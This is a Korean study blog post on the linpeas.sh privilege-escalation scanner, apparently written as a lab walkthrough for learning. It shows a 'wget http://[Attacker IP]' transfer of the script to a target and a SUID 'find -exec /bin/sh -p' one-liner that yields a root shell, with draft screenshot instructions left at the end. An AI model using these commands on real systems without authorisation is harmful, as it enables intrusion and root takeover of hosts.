---
layout: post
title: "PEASS-ng 공부"
date: 2025-09-17 17:00:00 +0900
categories: Study 시스템 해킹
---

### 1. 개요

PEASS-ng(Privilege Escalation Awesome Scripts SUITE new generation)는 권한 상승을 위한 정보를 자동으로 수집해 주는 스크립트 모음이다. 이 중 `linpeas.sh`는 리눅스 환경에서 실행되며 시스템의 설정 오류 · 커널 버전 · SUID 파일 · cron 작업 등 권한 상승에 이용될 수 있는 거의 모든 항목을 검사하고 결과를 색상으로 구분하여 보여준다.

수동으로 정보를 수집하는 과정을 자동화하여 분석 시간을 크게 단축시킨다.

---

### 2. 스크립트 실행 방법

`linpeas.sh` 스크립트를 공격 대상 서버로 옮긴 후 실행 권한을 부여하고 실행하는 과정이 필요하다.

#### **1. 스크립트 전송**
공격자 PC에서 웹 서버를 열고 대상 서버에서 `wget` 이나 `curl` 명령어로 스크립트를 다운로드하는 것이 일반적이다.

*   **공격자 PC:**
    ```bash
    # linpeas.sh 파일이 있는 디렉터리에서 실행
    python3 -m http.server 8000
    ```
*   **대상 서버:**
    ```bash
    # 쓰기 가능한 디렉터리(예: /tmp)로 이동
    cd /tmp
    wget http://[Attacker IP]:8000/linpeas.sh
    ```

#### **2. 스크립트 실행**
다운로드한 스크립트에 실행 권한을 부여하고 실행한다.
```bash
chmod +x linpeas.sh
./linpeas.sh
```

---

### 3. 결과 분석

`linpeas.sh`는 실행 결과에서 잠재적인 취약점 항목을 색상으로 강조하여 보여준다.

*   **빨간색 + 노란색 배경:** 95% 확률로 권한 상승에 이용 가능한 매우 중요한 항목.
*   **빨간색:** 흥미롭거나 주의 깊게 봐야 할 항목.
*   **노란색:** 추가적인 정보가 될 수 있는 항목.

[여기에 linpeas.sh 실행 결과 화면 스크린샷 삽입]

결과 보고서를 통해 SUID가 설정된 바이너리, 시스템 권한으로 실행되는 cron 작업 `sudo -l` 로 확인한 권한 등 권한 상승에 결정적인 단서가 될 수 있는 정보들을 한눈에 파악할 수 있다. 예를 들어 `(i) find results` 섹션에서 [GTFOBins](https://gtfobins.github.io/)에 등재된 SUID 파일을 발견했다면 이를 직접적인 공격 경로로 활용할 수 있다.

### 4. 사용 예시: SUID 바이너리를 이용한 권한 상승

이 예시는 `linpeas.sh`가 찾아낸 `SUID` 설정 파일을 이용하여 `root` 권한을 획득하는 과정을 보여준다. '정보 수집 -> 분석 -> 공격 실행'의 전체 흐름을 따른다.

#### **1. 정보 수집 (linpeas.sh)**
**`./linpeas.sh`** 를 실행하여 시스템을 스캔한다. 스캔 결과 중 `SUID/SGID Binaries` 섹션에서 권한 상승에 악용될 수 있는 파일 목록을 확인한다.

아래 예시에서는 **`/usr/bin/find`** 파일이 SUID 비트가 설정되어 있고 **GTFOBins**에 등재되어 있어 권한 상승에 이용 가능하다고 **빨간색+노란색 배경**으로 강조되어 있다.

[여기에 linpeas.sh가 find SUID를 발견한 결과 스크린샷 삽입]

#### **2. 분석 (GTFOBins)**
**GTFOBins**는 유닉스 바이너리를 이용한 권한 상승 및 다양한 기능 우회 방법을 모아놓은 리소스이다. `linpeas.sh`가 알려준 **`find`** 바이너리를 GTFOBins 사이트에서 검색한다.

GTFOBins는 `find`의 SUID를 이용하여 쉘을 실행하는 아래의 명령어를 제공한다.
```bash
find . -exec /bin/sh -p \; -quit
```

#### **3. 공격 실행 (권한 상승)**
획득한 일반 사용자 쉘에서 GTFOBins에서 찾은 명령어를 그대로 실행한다.

```bash
find . -exec /bin/sh -p \; -quit
# id
uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
# whoami
root
```
*   명령어를 실행하면 프롬프트는 그대로지만 **`-p`** 옵션으로 인해 유효 사용자 ID(`euid`)가 `root`로 설정된 쉘이 실행된다.
*   **`id`** 명령어를 실행하면 `euid=0(root)`로 표시되어 권한이 상승했음을 확인할 수 있다.
*   **`whoami`** 명령어 역시 `root`를 반환한다.

이 과정을 통해 `linpeas.sh`로 수집한 정보를 바탕으로 분석하여 실제 `root` 권한을 획득하는 데 성공했다.

<hr class="short-rule">





### 시각 자료(이미지) 제작을 위한 스크립트

#### **linpeas.sh 실행 결과 화면 스크린샷 제작**

1.  공격 대상 서버의 `/tmp` 디렉터리에 `linpeas.sh` 스크립트를 업로드하고 실행합니다.
2.  스크립트가 실행되면서 수많은 정보가 터미널에 출력됩니다. 스크롤을 올려 스크립트 시작 부분의 `LEGEND` (범례)가 보이도록 합니다.
3.  `LEGEND`와 함께, 아래 결과 중 **빨간색+노란색 배경**으로 표시된 중요 취약점(예: `Writable /etc/passwd file`) 또는 **빨간색**으로 표시된 SUID 파일 목록 등이 잘 보이도록 화면을 구성합니다.
4.  터미널 화면 전체를 스크린샷으로 찍습니다.
5.  이미지 편집 프로그램을 사용하여 스크린샷을 엽니다.
6.  `LEGEND` 부분에 사각형 박스를 하나 그리고, 실제 결과에서 빨간색 또는 노란색으로 강조된 주요 취약점 항목에 또 다른 사각형 박스를 그려 하이라이트합니다.
7.  수정된 이미지를 저장하여 게시글에 삽입합니다.

#### **find SUID 발견 및 권한 상승 과정 이미지 제작**

이 이미지는 `linpeas.sh`의 발견(원인)과 실제 권한 상승(결과)을 연결하여 보여준다.

1.  **`linpeas.sh` 결과 캡처:**
    *   `linpeas.sh`를 실행한 결과 중, `/usr/bin/find`가 SUID로 강조된 부분(빨간색+노란색 배경)이 잘 보이도록 화면을 구성하여 스크린샷을 찍어 **`linpeas_find_discovery.png`**로 저장한다.
2.  **권한 상승 터미널 캡처:**
    *   일반 사용자 쉘에서 `find . -exec /bin/sh -p \; -quit` 명령어를 입력하고, 이어서 `id`와 `whoami` 명령어를 실행한 결과(`euid=0(root)`, `root`)까지 모두 보이는 터미널 화면을 스크린샷으로 찍어 **`privesc_find_result.png`**로 저장한다.
3.  **최종 이미지 편집:**
    *   이미지 편집 프로그램에서 `linpeas_find_discovery.png`(왼쪽)와 `privesc_find_result.png`(오른쪽)를 나란히 배치한다.
    *   왼쪽 이미지에서는 `/usr/bin/find`가 강조된 라인 전체에 추가로 하이라이트를 적용한다.
    *   오른쪽 이미지에서는 실행한 `find` 명령어와, 그 결과로 나타난 `euid=0(root)` 및 `root` 출력 부분에 하이라이트를 적용한다.
    *   두 이미지 사이에 화살표를 추가하여 `linpeas.sh`의 발견이 실제 권한 상승으로 이어졌음을 명확히 보여준다.
    *   수정된 이미지를 게시글에 삽입한다.